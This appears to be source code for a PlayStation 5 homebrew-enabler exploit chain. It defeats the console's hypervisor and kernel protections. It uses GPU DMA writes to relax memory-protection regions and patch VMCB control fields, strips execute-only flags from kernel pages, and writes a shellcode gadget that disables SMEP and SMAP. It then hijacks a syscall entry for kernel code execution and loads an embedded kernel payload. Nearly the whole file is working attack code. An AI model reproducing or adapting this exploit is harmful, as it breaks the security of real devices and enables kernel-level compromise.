#include <sys/types.h>
#include <sys/syscall.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <print>
#include <fcntl.h>
#include <sys/cpuset.h>

extern "C" int cpuset(cpusetid_t *);

#include "hv_defeat.h"
#include "util.h"
#include "gpu_dma.h"
#include "patches.h"

int stage0_discover(hv_defeat_ctx *ctx) {
    std::print("\n[stage0] discovery\n");

    ctx->fw = kernel_get_fw_version() >> 16;
    g_fw() = ctx->fw;

    if (!fw_supported(ctx->fw)) {
        std::print("  fw 0x{:04x} not supported\n", ctx->fw);
        return -1;
    }

    ctx->kbase = (uint64_t)KERNEL_ADDRESS_DATA_BASE - fw_off(ctx->fw, "KDATA_OFFSET");

    uint64_t kdata = KERNEL_ADDRESS_DATA_BASE;
    uint64_t ktext = KERNEL_ADDRESS_TEXT_BASE;

    int32_t ml4i = (int32_t)kr4(ctx->kbase + fw_off(ctx->fw, "OFF_DMPML4I"));
    int32_t dpi  = (int32_t)kr4(ctx->kbase + fw_off(ctx->fw, "OFF_DMPDPI"));
    ctx->dmap_base = ((uint64_t)dpi << 30) | ((uint64_t)ml4i << 39) | 0xFFFF800000000000ULL;

    ctx->hv_data_va = (uint64_t)KERNEL_ADDRESS_TEXT_BASE + fw_off(ctx->fw, "KERNEL_TEXT_SIZE");

    std::print("  kbase     0x{:x}\n", ctx->kbase);
    std::print("  dmap      0x{:x}\n", ctx->dmap_base);
    std::print("  hv_data   0x{:x}\n", ctx->hv_data_va);
    std::print("  fw        0x{:04x}\n", ctx->fw);
    std::print("  kdata 0x{:x} ktext 0x{:x}\n", kdata, ktext);

    if ((uint32_t)dr4(ctx->dmap_base, ECAM_B0D18F2) != 0xFFFFFFFF) {
        for (int t = 0; t < 22; t++) {
            uint32_t b = tmr_read(ctx->dmap_base, TMR_BASE(t));
            uint32_t l = tmr_read(ctx->dmap_base, TMR_LIMIT(t));
            uint32_t c = tmr_read(ctx->dmap_base, TMR_CONFIG(t));
            if (c == 0 && b == 0 && l == 0) continue;
            std::print("  tmr[{:2d}] 0x{:012x}-0x{:012x} cfg=0x{:08x}\n",
                t, (uint64_t)b << 16, ((uint64_t)l << 16) | 0xFFFF, c);
        }
    }
    return 0;
}

static int tmr_relax_for_pa(uint64_t dmap, uint64_t pa,
                            uint32_t *saved, int *count) {
    uint32_t pa16 = (uint32_t)(pa >> 16);
    for (int i = MAX_TMR - 1; i >= 0; i--) {
        if (i == 19 || i == 20) continue;
        uint32_t b = tmr_read(dmap, TMR_BASE(i));
        uint32_t l = tmr_read(dmap, TMR_LIMIT(i));
        uint32_t c = tmr_read(dmap, TMR_CONFIG(i));
        if ((c & 1) == 0 || pa16 < b || pa16 > l) continue;

        if (*count < MAX_SAVED_TMRS) {
            saved[*count * 2] = (uint32_t)i;
            saved[*count * 2 + 1] = c;
            (*count)++;
        }
        tmr_write(dmap, TMR_CONFIG(i), TMR_CFG_PERMISSIVE);
        uint32_t v = tmr_read(dmap, TMR_CONFIG(i));
        std::print("  tmr[{}] 0x{:08x} -> 0x{:08x}{}\n", i, c, v,
            (v == TMR_CFG_PERMISSIVE) ? "" : " FAIL");
        if (v != TMR_CFG_PERMISSIVE) return -1;
    }
    return 0;
}

int stage1_tmr_relax(hv_defeat_ctx *ctx) {
    std::print("\n[stage1] tmr patching\n");
    if ((uint32_t)dr4(ctx->dmap_base, ECAM_B0D18F2) == 0xFFFFFFFF) return -1;
    if (ctx->fw >= 0x0500) { std::print("  patched on 5.00+\n"); return -2; }

    ctx->saved_tmr_count = 0;
    uint64_t kpa = (uint64_t)tmr_read(ctx->dmap_base, TMR_BASE(16)) << 16;

    int ret = tmr_relax_for_pa(ctx->dmap_base, kpa, ctx->saved_tmrs, &ctx->saved_tmr_count);
    if (ret) return ret;

    if (ctx->fw >= 0x0300) {
        uint32_t t17 = tmr_read(ctx->dmap_base, TMR_BASE(17));
        if (t17) {
            ret = tmr_relax_for_pa(ctx->dmap_base, (uint64_t)t17 << 16,
                                   ctx->saved_tmrs, &ctx->saved_tmr_count);
            if (ret) return ret;
        }
    }

    ctx->tmr_disabled = 1;
    std::print("  {} tmrs modified\n", ctx->saved_tmr_count);
    return 0;
}

uint64_t get_vmcb (hv_defeat_ctx *ctx, int core) {
    switch (ctx->fw) {
        case 0x0300:
        case 0x0310:
        case 0x0320:
        case 0x0321:
            return (uint64_t) 0x6290B000 + (uint64_t) core * 0x3000;
            break;
        case 0x0400:
        case 0x0402:
        case 0x0403:
        case 0x0450:
        case 0x0451:
            return (uint64_t) 0x62A05000 + (uint64_t) core * 0x3000;
            break;
        default:
            return -1;
    }
}

int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
    std::print("\n[stage2] vmcb discovery\n");

    uint64_t vcpu_off = fw_off(ctx->fw, "HV_VCPU");
    uint64_t stride   = fw_off(ctx->fw, "HV_VCPU_CPUID");
    // Testing direct VMCB on 04.03
    if ((!vcpu_off || !stride) && ctx->fw != 0x0403) {
        std::print("  missing HV_VCPU offsets for fw 0x{:04x}\n", ctx->fw);
        return -1;
    }

    uint64_t hv_data_pa;
    if (ctx->fw >= 0x0300) {
        // fw 3.00+: HV is separate, PA from TMR17
        uint32_t t17 = tmr_read(ctx->dmap_base, TMR_BASE(17));
        if (!t17) {
            std::print("  tmr17 base is 0, can't find HV region\n");
            return -1;
        }
        hv_data_pa = (uint64_t)t17 << 16;
        std::print("  hv separate, pa=0x{:x} (from tmr17)\n", hv_data_pa);
    } else {
        // fw < 3.00: HV embedded after kernel text
        uint64_t ktext_pa = (uint64_t)tmr_read(ctx->dmap_base, TMR_BASE(16)) << 16;
        hv_data_pa = ktext_pa + fw_off(ctx->fw, "KERNEL_TEXT_SIZE");
        std::print("  hv embedded, pa=0x{:x}\n", hv_data_pa);
    }
    ctx->hv_data_pa = hv_data_pa;

    ctx->vmcb_count = 0;
    for (int c = 0; c < 16; c++) {
        uint64_t ptr_pa;

        if (ctx->fw >= 0x0300) {
            uint64_t vmcb_pa = get_vmcb(ctx, c);
            std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);

            if (ctx->vmcb_count < MAX_VMCBS) {
                ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
                ctx->vmcb_count++;
            }
        }
        else {
            // use VA + pmap_kextract (embedded HV has valid kernel VAs)
            uint64_t ptr_va = ctx->hv_data_va + vcpu_off + (uint64_t)c * stride;
            ptr_pa = pmap_kextract(ptr_va);


            uint64_t vmcb_va = gpu_read_phys8(ptr_pa);
            if ((vmcb_va >> 32) != 0xFFFFFFFF || (vmcb_va & 0xFFF) != 0) {
                std::print("  core {:2d}: bad vmcb_va 0x{:x}\n", c, vmcb_va);
                return -2;
            }

            uint64_t vmcb_pa = pmap_kextract(vmcb_va);
            std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);

            if (ctx->vmcb_count < MAX_VMCBS) {
                ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
                ctx->vmcb_count++;
            }
        }
    }
    std::print("  {} vmcbs\n", ctx->vmcb_count);
    return ctx->vmcb_count == 0 ? -2 : 0;
}

int stage3_patch_vmcbs(hv_defeat_ctx *ctx) {
    std::print("\n[stage3] vmcb patch\n");
    if (ctx->vmcb_count == 0) return -1;

    uint32_t np0 = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_NP_ENABLE);

    if( np0 == 0x0 )
    {
        notify("Hypervisor already disabled, aborting..");

        return 0;
    }

    if (np0 != 0x9) {
        std::print("  vmcb[0] np=0x{:x}, expected 0x9 - aborting\n", np0);
        return -2;
    }

    int cur = sceKernelGetCurrentCpu();
    pin_to_core(cur);

    for (int i = 0; i < ctx->vmcb_count; i++) {

        uint64_t pa = ctx->vmcb_pas[i];

        // read-modify-write: one GPU read, patch fields, one GPU write
        vmcb_control_patch ctl;
        gpu_read_phys(pa, &ctl, sizeof(ctl));

        ctl.np_enable      = 0;
        ctl.intercept_cr   = 0;
        ctl.intercept_exc  = 0;              // exception bitmap cleared
        ctl.intercept_misc = (1u << 18);     // keep CPUID
        ctl.intercept_vmxx = 0xF;            // VMSAVE/VMLOAD/VMMCALL/VMRUN
        ctl.tlb_control    = 1;              // flush TLB on VMRUN
        //ctl.vmcb_clean     = 0;              // nothing clean

        gpu_write_phys(pa, &ctl, sizeof(ctl));

        std::print("  vmcb[{:2d}] patched\n", i);
        usleep(1000);
    }

    for (int i = 0; i < 16; i++) {
        if (pin_to_core(i) == 0) {
            usleep(1000);
            getpid();
        }
    }
    usleep(200000);
    pin_to_core( 9 );

    ctx->vmcbs_patched = 1;
    std::print("  done, {} cores\n", ctx->vmcb_count);
    return 0;
}

int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
    std::print("\n[stage3b] xotext removal\n");

    pin_to_first_available_core();

    uint64_t pmap = ctx->kbase + fw_off(ctx->fw, "OFF_PMAP_STORE");
    uint64_t read_2 = 0;
    kernel_copyout(pmap, &read_2, sizeof(read_2));
    //std::print("pmap: {:016x} -> {:016x}\n", pmap, read_2);
    
    kernel_copyout(pmap + fw_off(ctx->fw, "PMAP_PM_PML4"), &read_2, 8);
    //std::print("pmap + pml4: {:016x} -> {:016x}\n", pmap + fw_off(ctx->fw, "PMAP_PM_PML4"), read_2);
    uint64_t start = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
    uint64_t end = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
    int n = 0;

    for (uint64_t a = start; a < end; a += 0x1000) {

        //std::print("VA to unlock : {:x}\n", a);

        uint64_t pde, pde_a = find_pde(pmap, a, &pde);
        if (pde_a != ~0ULL) {
            CLEAR_PDE_BIT(pde, XOTEXT); SET_PDE_BIT(pde, RW);
            kernel_copyin(&pde, pde_a, sizeof(pde));
            uint64_t read = 0;
            kernel_copyout(pde_a, &read, sizeof(read));
            //std::print("Entry pde a: {:x} pde_a: {:x} write: {:016x} read: {:016x}\n", a, pde_a, pde, read);
        }
        uint64_t pte, pte_a = find_pte(pmap, a, &pte);
        if (pte_a != ~0ULL) {
            CLEAR_PDE_BIT(pte, XOTEXT); SET_PDE_BIT(pte, RW);
            kernel_copyin(&pte, pte_a, sizeof(pte));
            uint64_t read3 = 0;
            kernel_copyout(pte_a, &read3, sizeof(read3));
            //std::print("Entry pte a: {:x} pte_a: {:x} write: {:016x} read: {:016x}\n\n", a, pte_a, pte, read3);
        }
        n++;
    }
    std::print("  {} pages\n", n);
    return 0;
}


int stage4_verify(hv_defeat_ctx *ctx) {
    usleep(5000000);
    std::print("\n[stage4] verify\n");

    //pin_to_first_available_core();

    uint64_t ktext = kr8((uint64_t)KERNEL_ADDRESS_TEXT_BASE);
    uint64_t hvdata = kr8(ctx->hv_data_va);
    uint32_t np = ctx->vmcb_count > 0 ? gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_NP_ENABLE) : 0xFF;

    std::print("  ktext  0x{:016x}{}\n", ktext, (ktext != 0 && ktext != ~0ULL) ? " ok" : " fail");
    std::print("  hvdata 0x{:016x}{}\n", hvdata, (hvdata != ~0ULL) ? " ok" : " fail");
    std::print("  np     0x{:x}{}\n", np, ((np & 0x9) == 0) ? " ok" : " fail");

    // verify intercepts persisted on vmcb[0]
    if (ctx->vmcb_count > 0) {
        uint32_t cr  = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_INTERCEPT_CR);
        uint32_t exc = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_INTERCEPT_EXC);
        uint32_t g1  = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_INTERCEPT_MISC);
        uint32_t g2  = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_INTERCEPT_VMXX);
        std::print("  vmcb0  cr=0x{:x} exc=0x{:x} g1=0x{:x} g2=0x{:x}{}\n",
            cr, exc, g1, g2, (cr == 0 && exc == 0 && g1 == 0) ? " ok" : " REVERTED");
    }
    return 0;
}


static int widen_cpuset_syscall() {
    cpusetid_t new_id;
    int ret = cpuset(&new_id);
    if (ret) {
        std::print("  cpuset() failed: ret={} errno={}\n", ret, errno);
        return -1;
    }
    std::print("  cpuset() new_id={}\n", new_id);
    cpuset_t mask;
    CPU_ZERO(&mask);
    mask.__bits[0] = 0xFFFF;

    ret = cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_CPUSET, new_id, 0x8, &mask);
    if (ret) {
        std::print("  cpuset_setaffinity() failed: ret={} errno={}\n", ret, errno);
        return -1;
    }
    return 0;
}

static int flush_tlb_all_cores(hv_defeat_ctx *ctx) {

    std::print("\n[tlb flush]\n");

    // B9 80 00 00 C0        mov ecx, 0xC0000080
    // 0F 32                 rdmsr
    // 0F 30                 wrmsr  (flush TLB + serialize pipeline)
    // 0F 20 E0              mov rax, cr4
    // 48 25 FF FF CF FF     and rax, 0xFFFFFFFFFFCFFFFF  (clear SMAP+SMEP)
    // 0F 22 E0              mov cr4, rax
    // B9 80 00 00 C0        mov ecx, 0xC0000080
    // 0F 32                 rdmsr
    // 25 FF FF FE FF        and eax, 0xFFFEFFFF  (clear NDA)
    // 0F 30                 wrmsr
    // C3                    ret
    uint8_t gadget[] = {
        0xB9, 0x80, 0x00, 0x00, 0xC0,
        0x0F, 0x32,
        0x0F, 0x30,
        0x0F, 0x20, 0xE0,
        0x48, 0x25, 0xFF, 0xFF, 0xCF, 0xFF,
        0x0F, 0x22, 0xE0,
        0xB9, 0x80, 0x00, 0x00, 0xC0,
        0x0F, 0x32,
        0x25, 0xFF, 0xFF, 0xFE, 0xFF,
        0x0F, 0x30,
        0xC3
    };

    uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
    uint64_t gadget_va = ktext + fw_off(ctx->fw, "KERNEL_OFF_CODE_CAVE") + 0x20000;
    uint64_t gadget_pa = pmap_kextract(gadget_va);
    gpu_write_phys(gadget_pa, gadget, sizeof(gadget));

    int flushed = 0;
    for (int i = 0; i < 16; i++) {
        if (pin_to_core(i) == 0) {
            kexec(gadget_va);
            usleep(1000);
            flushed++;
        } else {
            std::print("  core {} pin failed\n", i);
        }
    }
    unpin();
    std::print("  flushed {}/16 cores\n", flushed);
    return 0;
}

int stage5_patch_kernel(hv_defeat_ctx *ctx) {
    std::print("\n[stage5] kernel patches\n");

    uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;

    auto pit = fw_patches.find(ctx->fw);
    if (pit == fw_patches.end() || pit->second.empty()) {
        std::print("  no patches for fw 0x{:04x}\n", ctx->fw);
        return 0;
    }

    int n = 0;
    for (auto &p : pit->second) {
        uint64_t va = ktext + p.offset;
        uint64_t pa = pmap_kextract(va);
        if (pa && pa < 0x100000000ULL) {
            gpu_write_phys(pa, p.bytes, p.len);
            n++;
        }
    }
    std::print("  {} patches applied\n", n);

    return 0;
}

int stage6_install_kexec(hv_defeat_ctx *ctx) {
    std::print("\n[stage6] kexec\n");

    uint64_t ppr = fw_off(ctx->fw, "PPR_SYSENT");
    uint64_t gadget = fw_off(ctx->fw, "GADGET_JMP_PTR_RSI");
    if (!ppr || !gadget) {
        std::print("  missing offsets\n");
        return -1;
    }

    uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
    uint64_t entry_va = ktext + ppr + 0x11 * sizeof(struct sysent);
    uint64_t entry_pa = pmap_kextract(entry_va);
    uint64_t jmp = ktext + gadget;

    std::print("  sysent va=0x{:x} pa=0x{:x}\n", entry_va, entry_pa);

    if (!entry_pa || entry_pa > 0x100000000ULL) {
        std::print("  bad sysent PA\n");
        return -1;
    }

    gpu_write_phys4(entry_pa + offsetof(sysent, n_arg),     2);
    gpu_write_phys8(entry_pa + offsetof(sysent, sy_call),   jmp);
    gpu_write_phys4(entry_pa + offsetof(sysent, sy_flags),  0);
    gpu_write_phys4(entry_pa + offsetof(sysent, sy_thrcnt), 1);

    uint64_t v = gpu_read_phys8(entry_pa + offsetof(sysent, sy_call));
    std::print("  sysent[0x11].sy_call = 0x{:x}{}\n", v, (v == jmp) ? " ok" : " fail");

    return (v == jmp) ? 0 : -1;
}

int kexec(uint64_t fptr) {
    return syscall(0x11, fptr,
        kernel_get_fw_version() & 0xFFFF0000,
        (uint64_t)KERNEL_ADDRESS_TEXT_BASE);
}

extern "C" {
    extern uint8_t KELF[];
    extern uint64_t KELF_SZ;
}

int stage7_run_hen(hv_defeat_ctx *ctx) {
    std::print("\n[stage7] hen\n");

    uint64_t cave = fw_off(ctx->fw, "KERNEL_OFF_CODE_CAVE");
    if (!cave) {
        std::print("  missing code cave offset\n");
        return -1;
    }

    uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
    uint64_t dest = ktext + cave;

    uint64_t sz = KELF_SZ;
    uint64_t dest_pa = pmap_kextract(dest);
    if (!dest_pa || dest_pa > 0x100000000ULL) {
        std::print("  bad code cave PA\n");
        return -1;
    }

    // HEN binary fits in single 2MB GPU DMA window
    // Only chunk if the range crosses alignment boundary
    // Make sure that HEN fits into this 4MB window!!!

    constexpr uint64_t GPU_WINDOW = 2 * 0x100000;
    uint64_t window_end = (dest_pa & ~(GPU_WINDOW - 1)) + GPU_WINDOW;
    uint64_t first_chunk = window_end - dest_pa;

    if (first_chunk >= sz) {
        gpu_write_phys(dest_pa, KELF, (uint32_t)sz);
    } else {
        gpu_write_phys(dest_pa, KELF, (uint32_t)first_chunk);
        gpu_write_phys(dest_pa + first_chunk, &KELF[first_chunk],
                       (uint32_t)(sz - first_chunk));
    }

    usleep(100000);

    std::print("  copied {} bytes to 0x{:x}\n", sz, dest);

    pin_to_core( 9 );

    int ret = kexec(dest);
    std::print("  kexec returned 0x{:x}\n", ret);

    return ret;
}

int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
    hv_defeat_ctx ctx;
    memset(&ctx, 0, sizeof(ctx));
    // ctx.mp4_softc = mp4_softc;
    // ctx.zcn_bar2 = zcn_bar2;

    int r;

    if ((r = stage0_discover(&ctx))) return r;

    kernel_set_ucred_authid(getpid(), 0x4800000000000007);

    if (widen_cpuset_syscall() != 0)
        std::print("  cpuset widen failed\n");

    gpu_kernel_offsets go = {};
    go.proc_vmspace = KERNEL_OFFSET_PROC_P_VMSPACE;
    go.vmspace_vm_vmid = fw_off(ctx.fw, "VMSPACE_VM_VMID");
    go.sizeof_gvmspace = 0x100;
    go.gvmspace_page_dir_va = 0x38;
    go.gvmspace_size = 0x10;
    go.gvmspace_start_va = 0x08;
    go.data_base_gvmspace = fw_off(ctx.fw, "DATA_BASE_GVMSPACE");

    gpu_set_offsets(&go);
    if ((r = gpu_init())) return r;

    if ((r = stage1_tmr_relax(&ctx))) return r;

    if ((r = stage2_find_vmcbs(&ctx))) return r;

    if ((r = stage3_patch_vmcbs(&ctx))) return r;

    if ((r = stage3b_remove_xotext(&ctx))) return r;

    if (true) {

        kernel_pmap_invalidate_all();

        stage4_verify(&ctx);

        stage5_patch_kernel(&ctx);

        usleep(10000);

        if ((r = stage6_install_kexec(&ctx))) return r;

        flush_tlb_all_cores(&ctx);
    }

    usleep(100000);
    
    stage7_run_hen(&ctx);

    uint32_t fw_ver = kernel_get_fw_version();
    notify(std::format("Welcome To PS5HEN 1.3\nPlayStation 5 FW: {:d}.{:02d}\nBy SpecterDev, f0f, flat_z",
        (fw_ver >> 24) & 0xFF, (fw_ver >> 16) & 0xFF));

    return 0;
}


// Credits: idlesauce
// does pmap_invalidate_all(kernel_pmap)
// on 4.03, pmap_pcid_enabled and invpcid_works are both 0 - it seems zen 2 doesnt support INVPCID
// so this will do invltlb_glob invalidating all tlb caches, including global entries, on all cores
int kernel_pmap_invalidate_all(void) {

    std::print("[stage3c] invalidate paging entries\n");

    static uint64_t two_zero_pages[PAGE_SIZE * 2] = {0};

    int pipe_fds[2];
    // set O_NONBLOCK to avoid PIPE_DIRECTW
    if (pipe2(pipe_fds, O_NONBLOCK)) {
        return -1;
    }

    // the pipe starts off as 1 page large - we need to write into the pipe so it will grow to BIG_PIPE_SIZE
    // we need to make sure pmap_invalidate_all doesnt use the one page fast path
    if (write(pipe_fds[1], two_zero_pages, PAGE_SIZE * 2) < 0) {
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        return -1;
    }

    // dont need this anymore
    close(pipe_fds[1]);

    uint64_t read_fd_file_data = kernel_get_proc_file(-1, pipe_fds[0]);

    // for (uint64_t i=0; i<0x40; i=i+8) {
    //     uint64_t read_val;
    //     kernel_copyout(read_fd_file_data + i, &read_val, sizeof(read_val));
    //     std::print("Read value at add 0x{:016x} : 0x{:016x}\n", read_fd_file_data + i, read_val);
    // }

    // std::print("This is read_fd_file_data: {:016x}\n", read_fd_file_data);
    if (!INKERNEL(read_fd_file_data)) {
        close(pipe_fds[0]);
        return -1;
    }

    uint64_t read_fd_buffer;
    kernel_copyout(read_fd_file_data + 0x10, &read_fd_buffer, sizeof(read_fd_buffer));
    // std::print("This isread_fd_buffer: {:016x}\n", read_fd_buffer);
    if (!INKERNEL(read_fd_buffer)) {
        close(pipe_fds[0]);
        return -1;
    }

    // inside pmap_remove anyvalid has to be 1 for pmap_invalidate_all to be called
    // anyvalid is only set if there is at least 1 non global entry being removed
    // set the first entry as non global, its being removed anyway so its fine (?)
    if (!page_remove_global(read_fd_buffer)) {
        close(pipe_fds[0]);
        return -1;
    }

    // fd 0 is read end, it holds the buffer, this close is what does the pmap_invalidate_all
    // because pmap == kernel_pmap, it will do invltlb_glob
    close(pipe_fds[0]);
    return 0;
}